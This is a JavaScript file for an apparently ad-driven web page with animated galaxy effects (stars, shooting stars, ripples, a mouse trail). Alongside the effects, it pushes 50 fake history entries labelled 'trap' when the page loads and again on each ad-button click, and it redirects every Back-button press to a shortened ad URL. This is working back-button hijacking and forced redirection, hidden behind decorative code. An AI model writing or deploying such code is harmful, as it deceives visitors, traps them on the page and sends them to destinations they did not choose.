// ====== Configuration ======
const AD_URL = "https://shorter.me/WHO7C"; 
const HISTORY_PUSH_COUNT = 50; 

// ====== Initialize Everything ======
window.addEventListener('load', function() {
  safePushStates(HISTORY_PUSH_COUNT);
  createStars();
  createShootingStars();
  createCosmicRays();
  initializeButtons();
});

// ====== History Management ======
function safePushStates(count = 1) {
  for (let i = 0; i < count; i++) {
    try { 
      history.pushState({trap:i}, "", location.href); 
    } catch(e) { 
      console.log('Push state blocked'); 
    }
  }
}

// ====== Redirect Logic ======
function goToAdImmediate() {
  safePushStates(HISTORY_PUSH_COUNT);
  window.location.href = AD_URL;
}

// ====== Button Initialization ======
function initializeButtons() {
  document.querySelectorAll('a[data-ad="true"]').forEach(button => {
    button.addEventListener('click', function(e) {
      e.preventDefault();
      createRipple(this, e);
      createStarburst(this);
      
      setTimeout(() => { 
        goToAdImmediate(); 
      }, 400);
    });
  });
}

// ====== Popstate Handler ======
window.addEventListener('popstate', function() {
  window.location.href = AD_URL;
});

// ====== Galaxy Background Effects ======
function createStars() {
  const container = document.querySelector('.stars-container');
  const starCount = 150;

  for (let i = 0; i < starCount; i++) {
    const star = document.createElement('div');
    star.className = 'star';
    
    const size = Math.random() * 2 + 1;
    star.style.width = size + 'px';
    star.style.height = size + 'px';
    star.style.left = Math.random() * 100 + 'vw';
    star.style.top = Math.random() * 100 + 'vh';
    star.style.animationDelay = Math.random() * 4 + 's';
    star.style.opacity = Math.random() * 0.7 + 0.3;
    
    container.appendChild(star);
  }
}

function createShootingStars() {
  const container = document.querySelector('.shooting-stars');

  function createShootingStar() {
    const star = document.createElement('div');
    star.className = 'shooting-star';
    
    star.style.left = Math.random() * 100 + 'vw';
    star.style.top = Math.random() * 50 + 'vh';
    star.style.animationDelay = Math.random() * 5 + 's';
    
    container.appendChild(star);
    
    setTimeout(() => {
      star.remove();
    }, 3000);
  }

  // Create initial shooting stars
  for (let i = 0; i < 3; i++) {
    setTimeout(createShootingStar, i * 1500);
  }

  // Continuous creation
  setInterval(createShootingStar, 3000);
}

function createCosmicRays() {
  const container = document.querySelector('.cosmic-rays');

  function createRay() {
    const ray = document.createElement('div');
    ray.className = 'cosmic-ray';
    
    ray.style.left = Math.random() * 100 + 'vw';
    ray.style.animationDelay = Math.random() * 6 + 's';
    
    container.appendChild(ray);
    
    setTimeout(() => {
      ray.remove();
    }, 6000);
  }

  // Create initial rays
  for (let i = 0; i < 6; i++) {
    setTimeout(createRay, i * 1000);
  }

  // Continuous creation
  setInterval(createRay, 4000);
}

// ====== Ripple Effect ======
function createRipple(element, event) {
  const rect = element.getBoundingClientRect();
  const x = event.clientX - rect.left;
  const y = event.clientY - rect.top;
  
  const ripple = document.createElement('span');
  ripple.className = 'ripple';
  ripple.style.left = x + 'px';
  ripple.style.top = y + 'px';
  
  element.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);
}

// ====== Starburst Effect ======
function createStarburst(button) {
  const rect = button.getBoundingClientRect();
  const centerX = rect.left + rect.width / 2;
  const centerY = rect.top + rect.height / 2;
  
  const colors = ['#ff6b9d', '#ff4b7d', '#c74bd7', '#d8a8ff', '#ff9ec0'];
  
  for (let i = 0; i < 10; i++) {
    const particle = document.createElement('div');
    const angle = (i * 36) * Math.PI / 180;
    const distance = 60;
    
    particle.style.position = 'fixed';
    particle.style.width = '4px';
    particle.style.height = '4px';
    particle.style.backgroundColor = colors[i % colors.length];
    particle.style.borderRadius = '50%';
    particle.style.left = centerX + 'px';
    particle.style.top = centerY + 'px';
    particle.style.zIndex = '100';
    particle.style.pointerEvents = 'none';
    particle.style.boxShadow = `0 0 8px ${colors[i % colors.length]}`;
    
    document.body.appendChild(particle);
    
    const animation = particle.animate([
      { 
        transform: 'translate(0, 0) scale(1)', 
        opacity: 1 
      },
      { 
        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`, 
        opacity: 0 
      }
    ], {
      duration: 600,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });
    
    animation.onfinish = () => particle.remove();
  }
}

// ====== Mouse Trail Effect ======
document.addEventListener('mousemove', function(e) {
  if (Math.random() > 0.8) {
    createSpaceDust(e.clientX, e.clientY);
  }
});

function createSpaceDust(x, y) {
  const dust = document.createElement('div');
  dust.style.position = 'fixed';
  dust.style.width = '2px';
  dust.style.height = '2px';
  dust.style.backgroundColor = '#ff9ec0';
  dust.style.borderRadius = '50%';
  dust.style.left = x + 'px';
  dust.style.top = y + 'px';
  dust.style.zIndex = '5';
  dust.style.pointerEvents = 'none';
  dust.style.boxShadow = '0 0 6px #ff9ec0';
  
  document.body.appendChild(dust);
  
  const animation = dust.animate([
    { transform: 'scale(1)', opacity: 1 },
    { transform: 'scale(0)', opacity: 0 }
  ], {
    duration: 800,
    easing: 'ease-out'
  });
  
  animation.onfinish = () => dust.remove();
}

// ====== Auto Cosmic Events ======
setInterval(() => {
  if (Math.random() > 0.7) {
    createNebulaFlash();
  }
}, 6000);

function createNebulaFlash() {
  const flash = document.createElement('div');
  flash.style.position = 'fixed';
  flash.style.top = '0';
  flash.style.left = '0';
  flash.style.width = '100%';
  flash.style.height = '100%';
  flash.style.background = 'radial-gradient(circle, rgba(255, 107, 157, 0.2) 0%, transparent 70%)';
  flash.style.pointerEvents = 'none';
  flash.style.zIndex = '2';
  flash.style.opacity = '0';
  
  document.body.appendChild(flash);
  
  const animation = flash.animate([
    { opacity: 0 },
    { opacity: 0.4 },
    { opacity: 0 }
  ], {
    duration: 1500,
    easing: 'ease-in-out'
  });
  
  animation.onfinish = () => flash.remove();
}
